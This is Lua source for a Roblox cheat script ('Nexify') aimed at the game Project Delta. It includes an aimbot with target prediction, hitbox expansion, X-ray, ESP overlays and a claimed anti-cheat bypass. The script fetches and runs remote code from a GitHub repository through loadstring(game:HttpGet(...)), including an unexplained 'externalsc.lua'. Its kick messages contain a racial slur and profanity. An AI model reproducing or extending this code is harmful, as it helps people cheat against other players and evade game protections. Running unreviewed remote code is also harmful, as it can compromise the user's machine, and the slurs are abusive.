            {Title = "Nexify | SOLARA", Description = "A-C"},
            {OutlineColor = Color3.fromRGB(247, 172, 22), Time = 17.5, Type = "image"},
            {Image = "http://www.roblox.com/asset/?id=2592670449", ImageColor = Color3.fromRGB(255, 84, 84)}
        )




local character = player.Character or player.CharacterAdded:Wait()


local humanoid = character:WaitForChild("Humanoid")


local function toggleSwimmingState()
    
    local isSwimmingEnabled = humanoid:GetStateEnabled(Enum.HumanoidStateType.Swimming)
    
    
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming, not isSwimmingEnabled)
end


  










local function detectExecutor()
    
    if type(identifyexecutor) == "function" then
        local executorName = identifyexecutor()
        
        
        if executorName == "Solara" then
            return "Solara"
        elseif executorName == "Synapse" then
            return "Wave"
        elseif executorName == "JJSploit" then
            return "Solara"
        elseif executorName == "Synapse X" then
            return "Wave"
        elseif executorName == "Nezur" then
            return "Nezur"   
        elseif executorName == "Scythex" then
            return "Wave"
        elseif executorName == "MacSploit" then
            return "Solara"   
        elseif executorName == "Manti" then
            return "Manti"
        elseif executorName == "Wave" then
            return "Wave"
        elseif executorName == "Macsploit" then
            return "Wave"
        elseif executorName == "Celery" then
            return "Celery"
        end
    end
    
    
    return "Unknown Executor"
end


local executor = detectExecutor()

if executor == "Solara" then
    print("This script is running in Solara Executor.")
    executorname33 = "Solara"
elseif executor == "Wave" or executor == "Wave 5.0" then
    print("This script is running in Wave Executor (Called Loadstring!).")
    


local repo = 'https://raw.githubusercontent.com/97y1oHW/4991/main/'
local espLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/97y1oHW/4991/refs/heads/main/esplib3.lua'),true))()
local Library = loadstring(game:HttpGet(repo .. 'libbet.lua'))()
local ThemeManager = loadstring(game:HttpGet(repo .. 'ThemeManager.lua'))()
local SaveManager = loadstring(game:HttpGet(repo .. 'SaveManager.lua'))()
    return 

elseif executor == "Manti" then
    print("This script is running in Manti Executor (Not allowed)")
    plrs.LocalPlayer:Kick("\n🤥Fuck Manti Nigga")
    return
elseif executor == "MacSploit" then
    print("This script is running in MacSploit")
elseif executor == "Nezur" then
    warn("This script is running in Nezur Executor (This Executor Is Not Stable)")
elseif executor == "Celery" then
    plrs.LocalPlayer:Kick("\n🤥Fuck Celery")
    print("This script is running in Celery Executor.")
	return
else
    print("Unknown executor detected.")
end




local function applyHeadEffect(player)
    if player ~= localPlayer and player.Character then
        local head = player.Character:FindFirstChild("Head")
        if head then
            if isEnabled then
                
                head.Size = Vector3.new(headSizeMultiplier, headSizeMultiplier, headSizeMultiplier)
                head.Transparency = transparencyValue
            else
                
                head.Size = Vector3.new(1, 1, 1) 
                head.Transparency = 0
            end
        end
    end
end


local function toggleHeadEffect()
    isEnabled = not isEnabled 
    
    for _, player in pairs(players:GetPlayers()) do
        applyHeadEffect(player)
    end
end


local function checkForNewPlayers()
    while true do
        wait(10) 
        if isEnabled then
            for _, player in pairs(players:GetPlayers()) do
                applyHeadEffect(player)
            end
        end
    end
end


spawn(checkForNewPlayers)























    









function toggleAimbot()
    aimbotEnabled = not aimbotEnabled 

    if not aimbotEnabled then
        isAiming = false 
        targetHead = nil 
    end
end


function togglePrediction()
    predictionEnabled = not predictionEnabled 
    print("Prediction Enabled: ", predictionEnabled)
end


function toggleAdjustPrediction()
    adjustPredictionEnabled = not adjustPredictionEnabled 
    if not adjustPredictionEnabled then
        predictionFactor = 0.118 
    end
    print("Adjust Prediction Enabled: ", adjustPredictionEnabled)
    print("Current Prediction Factor: ", predictionFactor)
end


local function adjustPredictionFactor(distance)
    if adjustPredictionEnabled then
        if distance >= 400 then
            predictionFactor = 0.200
        elseif distance >= 300 then
            predictionFactor = 0.180
        elseif distance >= 230 then
            predictionFactor = 0.160
        elseif distance >= 100 then
            predictionFactor = 0.140
        else
            predictionFactor = 0.115 
        end
        print("Current Prediction Factor: ", predictionFactor)
    end
end


local function predictTargetPosition(target)
    if not predictionEnabled then
        return target.Position 
    end

    local targetCharacter = target.Parent
    local humanoidRootPart = targetCharacter:FindFirstChild("HumanoidRootPart")
    if humanoidRootPart then
        local velocity = humanoidRootPart.AssemblyLinearVelocity
        local currentPosition = target.Position
        
        
        adjustPredictionFactor(distance)  

        
        local predictedPosition = currentPosition + velocity * predictionFactor
        return predictedPosition
    end
    return target.Position
end


 function updateAimbot()
    if aimbotEnabled and isAiming then
        local target = mouse.Target 

        
        if target and target.Parent then
            local npcModel = target.Parent
            if npcModel:FindFirstChild("Humanoid") and npcModel:FindFirstChild("Head") then
                targetHead = npcModel.Head 
            end
        end

        
        if targetHead then
            local targetPosition = predictTargetPosition(targetHead)

            
            workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position, targetPosition)
        end
    end
end


mouse.Button2Down:Connect(function()
    if aimbotEnabled then
        isAiming = true 
    end
end)

mouse.Button2Up:Connect(function()
    isAiming = false 
    targetHead = nil 
end)


game:GetService("RunService").Heartbeat:Connect(updateAimbot)











local function getPing()
    local stats = game:GetService("Stats")
    local networkStats = stats.Network.ServerStatsItem["Data Ping"]
    return math.floor(networkStats:GetValue())
end


local function getFPS()
    local fps = workspace:GetRealPhysicsFPS()
    return math.floor(fps)
end


local function updateInfo()
    while true do
        infoLabel.Text = string.format("FPS: %d  Ping: %dms", getFPS(), getPing())
        wait(1)
    end
end


function toggleGrass()
    grassVisible = not grassVisible

    
    for _, terrain in ipairs(workspace:GetDescendants()) do
        if terrain:IsA("Terrain") then
            for _, decoration in ipairs(terrain:GetChildren()) do
                if decoration:IsA("Decoration") and decoration.Name:lower():find("grass") then
                    decoration.Transparency = grassVisible and 0 or 1
                end
            end
        end
    end
end









local counter = 0
print("loading Nexify")
print('load_' .. tostring(counter))


loadstring(game:HttpGet("https://raw.githubusercontent.com/97y1oHW/4991/refs/heads/main/externalsc.lua"))()
counter = counter + 1
do
counter4= "X1"
print("repo ok")



end
local repo = 'https://raw.githubusercontent.com/97y1oHW/4991/main/'
print("repo ok2")
print(counter4)
print(counter4)
print(counter4)
wait(0.2)
print(counter4)
print(counter4)
print(counter4)
print(counter4)
print(counter4)
print(counter4)
print(counter4)
print(counter4)
print(counter4)
print(counter4)
print(counter4)
print(counter4)
print(counter4)
texrfj="return"
print(texrfj)
wait(0.9)
warn("Disabled Client Anti-Cheat Bypass")


print("esplib ok")
print("1")
local Library = loadstring(game:HttpGet(repo .. 'libbet.lua'))()
print("1")
local ThemeManager = loadstring(game:HttpGet(repo .. 'ThemeManager.lua'))()
print("1")
local SaveManager = loadstring(game:HttpGet(repo .. 'SaveManager.lua'))()
print("1")
print('sucker_' .. tostring(counter))
counter = counter + 1
local Window = Library:CreateWindow({
    
    
    
    

    Title = '<font color="rgb(255, 255, 255)">Ne</font><font color="rgb(128, 0, 128)">x</font><font color="rgb(255, 255, 255)">ify / Solara </font><font color="rgb(255, 0, 0)">Project Delta</font>',
    Center = true,
    AutoShow = true,
    TabPadding = 7.9,
    MenuFadeTime = 0.3
})
local Tabs = {
    Main = Window:AddTab('combat ⚔️'),
    Visuals = Window:AddTab('esp 👤'),
    Misc = Window:AddTab('Misc 🔅'),
    Lua = Window:AddTab('Other 🛠️'),
    ['UI Settings'] = Window:AddTab('UI Settings'),
  
}

MenuGroup = Tabs['UI Settings']:AddLeftGroupbox('Menu')


ThemeManager:SetLibrary(Library)
SaveManager:SetLibrary(Library)



SaveManager:IgnoreThemeSettings()








ThemeManager:SetFolder('Nexify')
SaveManager:SetFolder('Nexify/ProjectDildo')


SaveManager:BuildConfigSection(Tabs['UI Settings'])



ThemeManager:ApplyToTab(Tabs['UI Settings'])



SaveManager:LoadAutoloadConfig()




loadstring(game:HttpGet("https://raw.githubusercontent.com/97y1oHW/4991/refs/heads/main/scriptinitializecheck3.lua"))()

local autoFireEnabled = false 
local plr = plrs.LocalPlayer
local mouse = plr:GetMouse()

local RunService = game:GetService("RunService")


local Lighting = game:GetService("Lighting")

local Visuals = Tabs.Visuals:AddRightTabbox()
local TabEsp = Tabs.Visuals:AddLeftTabbox()
local EnemyEspTab = TabEsp:AddTab('esp')

print('load_' .. tostring(counter))
counter = counter + 1




local tracers = {}


local function toggleTracer(player)
    
    if tracers[player] then
        tracers[player]:Destroy()  
        tracers[player] = nil
    else
        
        local head = player.Character and player.Character:FindFirstChild("Head")
        if head then
            
            local tracerPart = Instance.new("Part")
            tracerPart.Size = Vector3.new(0.2, 0.2, 2)  
            tracerPart.Anchored = true
            tracerPart.CanCollide = false
            tracerPart.Transparency = 0.5  
            tracerPart.Material = Enum.Material.Neon  
            tracerPart.Color = Color3.fromRGB(255, 255, 255)  
            tracerPart.Parent = workspace

            
            tracers[player] = tracerPart

            
            local connection
            connection = game:GetService("RunService").Heartbeat:Connect(function()
                if not tracers[player] or not player.Character or not player.Character:FindFirstChild("Head") then
                    connection:Disconnect()  
                    return
                end

                
                local headPosition = player.Character.Head.Position
                local lookDirection = player.Character.Head.CFrame.LookVector

                
                tracers[player].CFrame = CFrame.new(headPosition, headPosition + lookDirection) * CFrame.new(0, 0, -1)
            end)
        end
    end
end





local function toggleTracersForAllPlayersExceptLocal(localPlayer)
    for _, player in pairs(game.Players:GetPlayers()) do
        if player ~= localPlayer then
            toggleTracer(player)
        end
    end
end


game.Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function()
        
        wait(1)
        local localPlayer = game.Players.LocalPlayer
        if player ~= localPlayer then
            toggleTracer(player)  
        end
    end)
end)

local localPlayer = players.LocalPlayer
local workspace = game:GetService("Workspace")



local espEnabled = false
local chamsEnabled = false
local espObjects = {}
local healthBillboards = {}


local customFactor = 0.29


local function create2DBox()
    local box = {}
    box.topLeft = Drawing.new("Line")
    box.topRight = Drawing.new("Line")
    box.bottomLeft = Drawing.new("Line")
    box.bottomRight = Drawing.new("Line")

    for _, line in pairs(box) do
        line.Color = Color3.new(1, 1, 1) 
        line.Thickness = 1
        line.Transparency = 1
    end

    return box
end


local function update2DBox(box, character)
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    if not rootPart then return end

    local corners = {
        rootPart.Position + Vector3.new(-2, 3, -1),
        rootPart.Position + Vector3.new(2, 3, -1),
        rootPart.Position + Vector3.new(-2, -3, -1),
        rootPart.Position + Vector3.new(2, -3, -1)
    }

    local screenCorners = {}
    for i, corner in ipairs(corners) do
        local screenPos, onScreen = camera:WorldToViewportPoint(corner)
        if onScreen then
            screenCorners[i] = Vector2.new(screenPos.X, screenPos.Y)
        else
            for _, line in pairs(box) do
                line.Visible = false
            end
            return
        end
    end

    box.topLeft.From = screenCorners[1]
    box.topLeft.To = screenCorners[2]
    box.bottomLeft.From = screenCorners[3]
    box.bottomLeft.To = screenCorners[4]
    box.topRight.From = screenCorners[1]
    box.topRight.To = screenCorners[3]
    box.bottomRight.From = screenCorners[2]
    box.bottomRight.To = screenCorners[4]

    for _, line in pairs(box) do
        line.Visible = true
    end
end


local function remove2DBox(box)
    for _, line in pairs(box) do
        line:Remove()
    end
end


local function createOrUpdateESP(player)
    local character = player.Character
    if not character or not character:FindFirstChild("HumanoidRootPart") then return end

    if not espObjects[player] then
        local boxESP = create2DBox()

        local billboard = Instance.new("BillboardGui")
        billboard.Adornee = character.HumanoidRootPart
        billboard.Size = UDim2.new(0, 200, 0, 50)
        billboard.StudsOffset = Vector3.new(0, 3, 0)
        billboard.AlwaysOnTop = true
        billboard.Parent = character.HumanoidRootPart

        local nameHealthLabel = Instance.new("TextLabel", billboard)
        nameHealthLabel.BackgroundTransparency = 1
        nameHealthLabel.Size = UDim2.new(0, 200, 0, 11)
        nameHealthLabel.Font = Enum.Font.Code
        nameHealthLabel.TextSize = 11
        nameHealthLabel.TextColor3 = Color3.new(1, 1, 1)
        nameHealthLabel.TextStrokeTransparency = 0.8

        local healthBar = Instance.new("Frame", billboard)
        healthBar.BackgroundColor3 = Color3.new(0.121569, 0.945098, 0.011765) 
        healthBar.Size = UDim2.new(0, 20, 0, 50)
        healthBar.Position = UDim2.new(0, 210, 0, 0)
        healthBar.BorderSizePixel = 0
        healthBar.BackgroundTransparency = 0.5

        local distanceBillboard = Instance.new("BillboardGui")
        distanceBillboard.Adornee = character.HumanoidRootPart
        distanceBillboard.Size = UDim2.new(0, 200, 0, 11)
        distanceBillboard.StudsOffset = Vector3.new(0, -2, 0)
        distanceBillboard.AlwaysOnTop = true
        distanceBillboard.Parent = character.HumanoidRootPart

        local distanceLabel = Instance.new("TextLabel", distanceBillboard)
        distanceLabel.BackgroundTransparency = 1
        distanceLabel.Size = UDim2.new(0, 200, 0, 11)
        distanceLabel.Font = Enum.Font.Code
        distanceLabel.TextSize = 11
        distanceLabel.TextColor3 = Color3.new(1, 1, 1)
        distanceLabel.TextStrokeTransparency = 0.8

        espObjects[player] = {
            boxESP = boxESP,
            nameHealthLabel = nameHealthLabel,
            healthBar = healthBar,
            distanceLabel = distanceLabel
        }
    end

    local humanoid = character:FindFirstChild("Humanoid")
    if humanoid then
        local health = humanoid.Health
        local maxHealth = humanoid.MaxHealth
        espObjects[player].nameHealthLabel.Text = string.format("%s | %d/%d", player.Name, health, maxHealth)

        local healthBar = espObjects[player].healthBar
        healthBar.Size = UDim2.new(0, 20, 0, 50 * (health / maxHealth))

        local distance = (character.HumanoidRootPart.Position - localPlayer.Character.HumanoidRootPart.Position).Magnitude * customFactor
        espObjects[player].distanceLabel.Text = string.format("%.2f m", distance)

        update2DBox(espObjects[player].boxESP, character)
    end
end


local function removeESP(player)
    if espObjects[player] then
        remove2DBox(espObjects[player].boxESP)
        espObjects[player].nameHealthLabel:Destroy()
        espObjects[player].healthBar:Destroy()
        espObjects[player].distanceLabel:Destroy()
        espObjects[player] = nil
    end
end


local function checkNearbyPlayers()
    while espEnabled do
        local localCharacter = localPlayer.Character
        if localCharacter and localCharacter:FindFirstChild("HumanoidRootPart") then
            for _, player in pairs(players:GetPlayers()) do
                if player ~= localPlayer then
                    local character = player.Character
                    if character and character:FindFirstChild("HumanoidRootPart") then
                        createOrUpdateESP(player)
                    else
                        removeESP(player)
                    end
                end
            end
        end
        wait(0.00001) 
    end
end


local function applyHighlight(player)
    local character = player.Character
    if character and character:FindFirstChild("HumanoidRootPart") then
        if not character:FindFirstChild("HighlightEffect") then
            local highlight = Instance.new("Highlight")
            highlight.Name = "HighlightEffect"
            highlight.Adornee = character
            highlight.FillColor = Color3.fromRGB(255, 255, 255)
            highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
            highlight.FillTransparency = 0.5
            highlight.OutlineTransparency = 0
            highlight.Parent = character
        end
    end
end

local function removeHighlight(player)
    local character = player.Character
    if character and character:FindFirstChild("HighlightEffect") then
        character.HighlightEffect:Destroy()
    end
end

local function toggleChams()
    chamsEnabled = not chamsEnabled
    for _, player in pairs(players:GetPlayers()) do
        if chamsEnabled then
            applyHighlight(player)
        else
            removeHighlight(player)
        end
    end
end


local function toggleESP()
    espEnabled = not espEnabled
    if espEnabled then
        coroutine.wrap(checkNearbyPlayers)()
    else
        for _, player in pairs(players:GetPlayers()) do
            removeESP(player)
        end
    end
end


local function cleanUpBoxes()
    while true do
        wait(10) 
        for _, espData in pairs(espObjects) do
            if espData.boxESP then
                remove2DBox(espData.boxESP)
                espData.boxESP = create2DBox() 
            end
        end
    end
end


coroutine.wrap(cleanUpBoxes)()









alreadyinit=false
function firstloadesplib()

if alreadyinit==false then
alreadyinit=true
wait(0.1)
espLib:Load()
end

end

 player = game.Players.LocalPlayer
 camera = workspace.CurrentCamera

-- Settings
 -- Key to toggle X-Ray
 xrayTransparency = 0.7 -- Level of transparency for X-Ray

-- Function to toggle X-Ray
 function toggleXRay(enabled)
    for _, object in pairs(workspace:GetDescendants()) do
        if object:IsA("BasePart") and not object:IsDescendantOf(player.Character) then
            -- Adjust transparency
            if enabled then
                object.Transparency = xrayTransparency
            else
                object.Transparency = object:GetAttribute("OriginalTransparency") or 0
            end
        end
    end
end

-- Save original transparency values
for _, object in pairs(workspace:GetDescendants()) do
    if object:IsA("BasePart") then
        object:SetAttribute("OriginalTransparency", object.Transparency)
    end
end

-- Listen for key presses to toggle X-Ray
 xrayEnabled = false


EnemyEspTab:AddToggle('xraythingyass', {
    Text = 'Enable X-Ray',
    Default = false,
    Risky = true,
    Callback = function(enabled)

        xrayEnabled = not xrayEnabled
        toggleXRay(xrayEnabled)


    end
    }):AddKeyPicker('xray', {
    Default = 'None',
    SyncToggleState = true,

    Mode = 'Toggle',

    Text = 'X-Ray Toggle Bind',
    NoUI = false,

    Callback = function(Value)
    end,
})

EnemyEspTab:AddToggle('EspSwitch', {
    Text = 'Enable ESP',
    Default = false,
    Risky = true,
    Callback = function(enabled)
    firstloadesplib()
        espLib.options.enabled = enabled
    end
})

EnemyEspTab:AddToggle('EspSwitch2', {
    Text = 'Box Fill',
    Default = false,
    Risky = false,
    Callback = function(enabled)
        espLib.options.boxFill = enabled
    end
})

EnemyEspTab:AddSlider('boxfilltr', {
    Text = 'Box Fill Transparency',
    Default = 0.8,
    Min = 0,
    Max = 1,
    Rounding = 3,
    Compact = false,

    Callback = function(Value)
        espLib.options.boxFillTransparency = Value
        
    end
})

        espLib.options.boxFillTransparency = 0.8

EnemyEspTab:AddLabel('Fill Box Color Picker'):AddColorPicker('Fill Box Color Picker', {
    Default = Color3.fromRGB(255, 255, 255),  
    Title = 'Fill Box Color Picker',
    Transparency = 0,                         

    Callback = function(Value)

        espLib.options.boxFillColor = Value     
    end
})

-- esp.lua
--// Variables
 Players = game:GetService("Players")
 RunService = game:GetService("RunService")
 localPlayer = Players.LocalPlayer
 camera = workspace.CurrentCamera
 cache = {}

 bones = {
    {"Head", "UpperTorso"},
    {"UpperTorso", "RightUpperArm"},
    {"RightUpperArm", "RightLowerArm"},
    {"RightLowerArm", "RightHand"},
    {"UpperTorso", "LeftUpperArm"},
    {"LeftUpperArm", "LeftLowerArm"},
    {"LeftLowerArm", "LeftHand"},
    {"UpperTorso", "LowerTorso"},
    {"LowerTorso", "LeftUpperLeg"},
    {"LeftUpperLeg", "LeftLowerLeg"},
    {"LeftLowerLeg", "LeftFoot"},
    {"LowerTorso", "RightUpperLeg"},
    {"RightUpperLeg", "RightLowerLeg"},
    {"RightLowerLeg", "RightFoot"}
}

--// Settings
 ESP_SETTINGS = {
    BoxOutlineColor = Color3.new(0, 0, 0),
    BoxColor = Color3.new(1, 1, 1),
    NameColor = Color3.new(1, 1, 1),
    HealthOutlineColor = Color3.new(0, 0, 0),
    HealthHighColor = Color3.new(0, 1, 0),
    HealthLowColor = Color3.new(1, 0, 0),
    CharSize = Vector2.new(4, 6),
    Teamcheck = false,
    WallCheck = false,
    Enabled = true,
    ShowBox = false,
    BoxType = "Corner Box Esp",
    ShowName = false,
    ShowHealth = false,
    ShowDistance = false,
    ShowSkeletons = false,
    ShowTracer = false,
    TracerColor = Color3.new(1, 1, 1), 
    TracerThickness = 2,
    SkeletonsColor = Color3.new(1, 1, 1),
    TracerPosition = "Bottom",
}

 function create(class, properties)
    local drawing = Drawing.new(class)
    for property, value in pairs(properties) do
        drawing[property] = value
    end
    return drawing
end

 function createEsp(player)
    local esp = {
        tracer = create("Line", {
            Thickness = ESP_SETTINGS.TracerThickness,
            Color = ESP_SETTINGS.TracerColor,
            Transparency = 0.5
        }),
        boxOutline = create("Square", {
            Color = ESP_SETTINGS.BoxOutlineColor,
            Thickness = 3,
            Filled = false
        }),
        box = create("Square", {
            Color = ESP_SETTINGS.BoxColor,
            Thickness = 1,
            Filled = false
        }),
        name = create("Text", {
            Color = ESP_SETTINGS.NameColor,
            Outline = true,
            Center = true,
            Size = 13
        }),
        healthOutline = create("Line", {
            Thickness = 3,
            Color = ESP_SETTINGS.HealthOutlineColor
        }),
        health = create("Line", {
            Thickness = 1
        }),
        distance = create("Text", {
            Color = Color3.new(1, 1, 1),
            Size = 12,
            Outline = true,
            Center = true
        }),
        tracer = create("Line", {
            Thickness = ESP_SETTINGS.TracerThickness,
            Color = ESP_SETTINGS.TracerColor,
            Transparency = 1
        }),
        boxLines = {},
    }

    cache[player] = esp
    cache[player]["skeletonlines"] = {}
end

 function isPlayerBehindWall(player)
    local character = player.Character
    if not character then
        return false
    end

    local rootPart = character:FindFirstChild("HumanoidRootPart")
    if not rootPart then
        return false
    end

    local ray = Ray.new(camera.CFrame.Position, (rootPart.Position - camera.CFrame.Position).Unit * (rootPart.Position - camera.CFrame.Position).Magnitude)
    local hit, position = workspace:FindPartOnRayWithIgnoreList(ray, {localPlayer.Character, character})
    
    return hit and hit:IsA("Part")
end

 function removeEsp(player)
    local esp = cache[player]
    if not esp then return end

    for _, drawing in pairs(esp) do
        if drawing then
            warn("remove called but not found nigas")
        end
    end

    cache[player] = nil
end


 function updateEsp()
    for player, esp in pairs(cache) do
        local character, team = player.Character, player.Team
        if character and (not ESP_SETTINGS.Teamcheck or (team and team ~= localPlayer.Team)) then
            local rootPart = character:FindFirstChild("HumanoidRootPart")
            local head = character:FindFirstChild("Head")
            local humanoid = character:FindFirstChild("Humanoid")
            local isBehindWall = ESP_SETTINGS.WallCheck and isPlayerBehindWall(player)
            local shouldShow = not isBehindWall and ESP_SETTINGS.Enabled
            if rootPart and head and humanoid and shouldShow then
                local position, onScreen = camera:WorldToViewportPoint(rootPart.Position)
                if onScreen then
                    local hrp2D = camera:WorldToViewportPoint(rootPart.Position)
                    local charSize = (camera:WorldToViewportPoint(rootPart.Position - Vector3.new(0, 3, 0)).Y - camera:WorldToViewportPoint(rootPart.Position + Vector3.new(0, 2.6, 0)).Y) / 2
                    local boxSize = Vector2.new(math.floor(charSize * 1.8), math.floor(charSize * 1.9))
                    local boxPosition = Vector2.new(math.floor(hrp2D.X - charSize * 1.8 / 2), math.floor(hrp2D.Y - charSize * 1.6 / 2))

                    if ESP_SETTINGS.ShowName and ESP_SETTINGS.Enabled then
                        esp.name.Visible = true
                        esp.name.Text = string.lower(player.Name)
                        esp.name.Position = Vector2.new(boxSize.X / 2 + boxPosition.X, boxPosition.Y - 16)
                        esp.name.Color = ESP_SETTINGS.NameColor
                    else
                        esp.name.Visible = false
                    end

                    if ESP_SETTINGS.ShowBox and ESP_SETTINGS.Enabled then
                        if ESP_SETTINGS.BoxType == "2D" then
                            esp.boxOutline.Size = boxSize
                            esp.boxOutline.Position = boxPosition
                            esp.box.Size = boxSize
                            esp.box.Position = boxPosition
                            esp.box.Color = ESP_SETTINGS.BoxColor
                            esp.box.Visible = true
                            esp.boxOutline.Visible = true
                            for _, line in ipairs(esp.boxLines) do
                                line:Remove()
                            end
                        elseif ESP_SETTINGS.BoxType == "Corner Box Esp" then
                            local lineW = (boxSize.X / 5)
                            local lineH = (boxSize.Y / 6)
                            local lineT = 1
    
                            if #esp.boxLines == 0 then
                                for i = 1, 16 do
                                    local boxLine = create("Line", {
                                        Thickness = 1,
                                        Color = ESP_SETTINGS.BoxColor,
                                        Transparency = 1
                                    })
                                    esp.boxLines[#esp.boxLines + 1] = boxLine
                                end
                            end
    
                            local boxLines = esp.boxLines
    
                            -- top left
                            boxLines[1].From = Vector2.new(boxPosition.X - lineT, boxPosition.Y - lineT)
                            boxLines[1].To = Vector2.new(boxPosition.X + lineW, boxPosition.Y - lineT)
    
                            boxLines[2].From = Vector2.new(boxPosition.X - lineT, boxPosition.Y - lineT)
                            boxLines[2].To = Vector2.new(boxPosition.X - lineT, boxPosition.Y + lineH)
    
                            -- top right
                            boxLines[3].From = Vector2.new(boxPosition.X + boxSize.X - lineW, boxPosition.Y - lineT)
                            boxLines[3].To = Vector2.new(boxPosition.X + boxSize.X + lineT, boxPosition.Y - lineT)
    
                            boxLines[4].From = Vector2.new(boxPosition.X + boxSize.X + lineT, boxPosition.Y - lineT)
                            boxLines[4].To = Vector2.new(boxPosition.X + boxSize.X + lineT, boxPosition.Y + lineH)
    
                            -- bottom left
                            boxLines[5].From = Vector2.new(boxPosition.X - lineT, boxPosition.Y + boxSize.Y - lineH)
                            boxLines[5].To = Vector2.new(boxPosition.X - lineT, boxPosition.Y + boxSize.Y + lineT)
    
                            boxLines[6].From = Vector2.new(boxPosition.X - lineT, boxPosition.Y + boxSize.Y + lineT)
                            boxLines[6].To = Vector2.new(boxPosition.X + lineW, boxPosition.Y + boxSize.Y + lineT)
    
                            -- bottom right
                            boxLines[7].From = Vector2.new(boxPosition.X + boxSize.X - lineW, boxPosition.Y + boxSize.Y + lineT)
                            boxLines[7].To = Vector2.new(boxPosition.X + boxSize.X + lineT, boxPosition.Y + boxSize.Y + lineT)
    
                            boxLines[8].From = Vector2.new(boxPosition.X + boxSize.X + lineT, boxPosition.Y + boxSize.Y - lineH)
                            boxLines[8].To = Vector2.new(boxPosition.X + boxSize.X + lineT, boxPosition.Y + boxSize.Y + lineT)
    
                            -- inline
                            for i = 9, 16 do
                                boxLines[i].Thickness = 2
                                boxLines[i].Color = ESP_SETTINGS.BoxOutlineColor
                                boxLines[i].Transparency = 1
                            end
    
                            boxLines[9].From = Vector2.new(boxPosition.X, boxPosition.Y)
                            boxLines[9].To = Vector2.new(boxPosition.X, boxPosition.Y + lineH)
    
                            boxLines[10].From = Vector2.new(boxPosition.X, boxPosition.Y)
                            boxLines[10].To = Vector2.new(boxPosition.X + lineW, boxPosition.Y)
    
                            boxLines[11].From = Vector2.new(boxPosition.X + boxSize.X - lineW, boxPosition.Y)
                            boxLines[11].To = Vector2.new(boxPosition.X + boxSize.X, boxPosition.Y)
    
                            boxLines[12].From = Vector2.new(boxPosition.X + boxSize.X, boxPosition.Y)
                            boxLines[12].To = Vector2.new(boxPosition.X + boxSize.X, boxPosition.Y + lineH)
    
                            boxLines[13].From = Vector2.new(boxPosition.X, boxPosition.Y + boxSize.Y - lineH)
                            boxLines[13].To = Vector2.new(boxPosition.X, boxPosition.Y + boxSize.Y)
    
                            boxLines[14].From = Vector2.new(boxPosition.X, boxPosition.Y + boxSize.Y)
                            boxLines[14].To = Vector2.new(boxPosition.X + lineW, boxPosition.Y + boxSize.Y)
    
                            boxLines[15].From = Vector2.new(boxPosition.X + boxSize.X - lineW, boxPosition.Y + boxSize.Y)
                            boxLines[15].To = Vector2.new(boxPosition.X + boxSize.X, boxPosition.Y + boxSize.Y)
    
                            boxLines[16].From = Vector2.new(boxPosition.X + boxSize.X, boxPosition.Y + boxSize.Y - lineH)
                            boxLines[16].To = Vector2.new(boxPosition.X + boxSize.X, boxPosition.Y + boxSize.Y)
    
                            for _, line in ipairs(boxLines) do
                                line.Visible = true
                            end
                            esp.box.Visible = false
                            esp.boxOutline.Visible = false
                        end
                    else
                        esp.box.Visible = false
                        esp.boxOutline.Visible = false
                        for _, line in ipairs(esp.boxLines) do
                            line:Remove()
                        end
                        esp.boxLines = {}
                    end

                    if ESP_SETTINGS.ShowHealth and ESP_SETTINGS.Enabled then
                        esp.healthOutline.Visible = true
                        esp.health.Visible = true
                        local healthPercentage = player.Character.Humanoid.Health / player.Character.Humanoid.MaxHealth
                        esp.healthOutline.From = Vector2.new(boxPosition.X - 6, boxPosition.Y + boxSize.Y)
                        esp.healthOutline.To = Vector2.new(esp.healthOutline.From.X, esp.healthOutline.From.Y - boxSize.Y)
                        esp.health.From = Vector2.new((boxPosition.X - 5), boxPosition.Y + boxSize.Y)
                        esp.health.To = Vector2.new(esp.health.From.X, esp.health.From.Y - (player.Character.Humanoid.Health / player.Character.Humanoid.MaxHealth) * boxSize.Y)
                        esp.health.Color = ESP_SETTINGS.HealthLowColor:Lerp(ESP_SETTINGS.HealthHighColor, healthPercentage)
                    else
                        esp.healthOutline.Visible = false
                        esp.health.Visible = false
                    end

                    if ESP_SETTINGS.ShowDistance and ESP_SETTINGS.Enabled then
                        local distance = (camera.CFrame.p - rootPart.Position).Magnitude
                        esp.distance.Text = string.format("%.1f studs", distance)
                        esp.distance.Position = Vector2.new(boxPosition.X + boxSize.X / 2, boxPosition.Y + boxSize.Y + 5)
                        esp.distance.Visible = true
                    else
                        esp.distance.Visible = false
                    end

                    if ESP_SETTINGS.ShowSkeletons and ESP_SETTINGS.Enabled then
                        if #esp["skeletonlines"] == 0 then
                            for _, bonePair in ipairs(bones) do
                                local parentBone, childBone = bonePair[1], bonePair[2]
                                
                                if player.Character and player.Character[parentBone] and player.Character[childBone] then
                                    local skeletonLine = create("Line", {
                                        Thickness = 1,
                                        Color = ESP_SETTINGS.SkeletonsColor,
                                        Transparency = 1
                                    })
                                    esp["skeletonlines"][#esp["skeletonlines"] + 1] = {skeletonLine, parentBone, childBone}
                                end
                            end
                        end
                    
                        for _, lineData in ipairs(esp["skeletonlines"]) do
                            local skeletonLine = lineData[1]
                            local parentBone, childBone = lineData[2], lineData[3]
                    
                            if player.Character and player.Character[parentBone] and player.Character[childBone] then
                                local parentPosition = camera:WorldToViewportPoint(player.Character[parentBone].Position)
                                local childPosition = camera:WorldToViewportPoint(player.Character[childBone].Position)
                    
                                skeletonLine.From = Vector2.new(parentPosition.X, parentPosition.Y)
                                skeletonLine.To = Vector2.new(childPosition.X, childPosition.Y)
                                skeletonLine.Color = ESP_SETTINGS.SkeletonsColor
                                skeletonLine.Visible = true
                            else
                                skeletonLine:Remove()
                            end
                        end
                    else
                        for _, lineData in ipairs(esp["skeletonlines"]) do
                            local skeletonLine = lineData[1]
                            skeletonLine:Remove()
                        end
                        esp["skeletonlines"] = {}
                    end                    

                    if ESP_SETTINGS.ShowTracer and ESP_SETTINGS.Enabled then
                        local tracerY
                        if ESP_SETTINGS.TracerPosition == "Top" then
                            tracerY = 0
                        elseif ESP_SETTINGS.TracerPosition == "Middle" then
                            tracerY = camera.ViewportSize.Y / 2
                        else
                            tracerY = camera.ViewportSize.Y
                        end
                        if ESP_SETTINGS.Teamcheck and player.TeamColor == localPlayer.TeamColor then
                            esp.tracer.Visible = false
                        else
